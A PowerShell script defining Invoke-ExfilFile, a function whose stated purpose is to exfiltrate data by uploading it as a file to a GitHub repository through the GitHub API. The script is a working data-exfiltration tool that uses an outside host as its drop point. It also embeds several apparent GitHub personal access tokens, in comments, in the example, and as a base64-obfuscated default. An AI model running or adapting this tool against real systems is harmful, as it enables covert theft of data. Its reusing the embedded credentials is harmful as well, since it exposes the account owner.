function Invoke-ExfilFile
{

<#
.SYNOPSIS
Use this script to exfiltrate data to a new file in GitHub

.DESCRIPTION
This function attempts to upload a new file with the given contents to github.
If a file exists this will be deleted and replaced

.PARAMETER GHUser
GitHub Username

.PARAMETER GHRepo
GitHub repository

.PARAMETER GHPAT
GitHub Personal Access Token

.PARAMETER GHFilePath
GitHub filepath not including the filename so eg. testfolder/

.PARAMETER GHFileName
GitHub filename eg. testfile.txt

.PARAMETER data
Data to write to file


# This will be the filepath and contents? 
# Will this be for individual files or for blob content
# This will need to get hold of the username and personal access token. 

# I need a module/script capable of performing the following functions

# (1) Add/Delete files from GitHub
# (2) Add/ Retrieve 


.EXAMPLE
Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "6ad6248b0c3e98ba430a07a2379e49855b56e6c2" -GHFilePath "testfolder/" -GHFileName "testfile3" -data "a bit of test data"

#>


    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $GHUser = "nnh100",

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $GHRepo = "exfil",

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        #$GHPAT = "325e15bcc471887d08651a2a4e1cd1a87b76314e",
        #$GHPAT = "6ad6248b0c3e98ba430a07a2379e49855b56e6c2",
        $GHPAT = "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0YQ==", # This should be base 64 encoded

        [Parameter(Position =3, Mandatory = $False)]
        [String]
        $GHFilePath = "testfolder2/",

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $GHFileName = "testfile1",

        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $data = "this is a test to see if i can update this"


    )


    # This is the GitHub username and Personal Access Token 
    #$Token = 'nnh100:eb1d2888bed6b7c01fef32ea0ce8fe5b13e4dc39'
    #$Token = 'nnh100:325e15bcc471887d08651a2a4e1cd1a87b76314e'

    $GHPAT = [System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String($GHPAT)))

    $Token = $GHUser + ":" + $GHPAT


    # Convert this to base64
    $Base64Token = [System.Convert]::ToBase64String([char[]]$Token);
    $Headers = @{
        Authorization = 'Basic {0}' -f $Base64Token;
    };


    # Before deleting or inserting check to see if the file exists, if it does then get the sha and delete the file first
    $GHAPI = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $GHFilePath + $GHFileName

    $Body = @{
        path = $GHFilePath + $GHFileName;
        ref = "master";
    }


    Try {
        $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction Stop
         # If we get here that means we were able to get the contents so get hold of the sha
        $sha = $content.sha
        Write-Host $sha
    }
    Catch {
        
        $ErrorMessage = $_.Exception.Message;
        Write-Host "Trying to get file contents: " + $ErrorMessage;
    }

   

    # Delete the file if it already exists
    if ($sha -ne $null){
    
        #Invoke-RestMethod -Headers $Headers -Uri https://api.github.com/repos/nnh100/exfil/contents/testfolder/testfile -Method Delete
        
        $Body = @{
            path = $GHFileName;
            message = "deleted file";
            sha = $sha;
    
        } | ConvertTo-Json;

        try{
            Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Delete -ErrorAction Stop
        }
        catch{
            $ErrorMessage = $_.Exception.Message;
            Write-Host "Trying to delete file: " + $ErrorMessage;
        }
    } 


    # Here we are adding the file
    $Body = @{
        path = $GHFileName;
        content = [System.Convert]::ToBase64String([char[]]$data);
        encoding = 'base64';
        message = "Commit at: " + (Get-Date); 
        } | ConvertTo-Json;


        try{            
            $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction Stop
            Write-Host "Successfully uploaded file!"
        }
        catch{
            $ErrorMessage = $_.Exception.Message;
            Write-Host "Trying to create file: " + $ErrorMessage;
        }
    



}





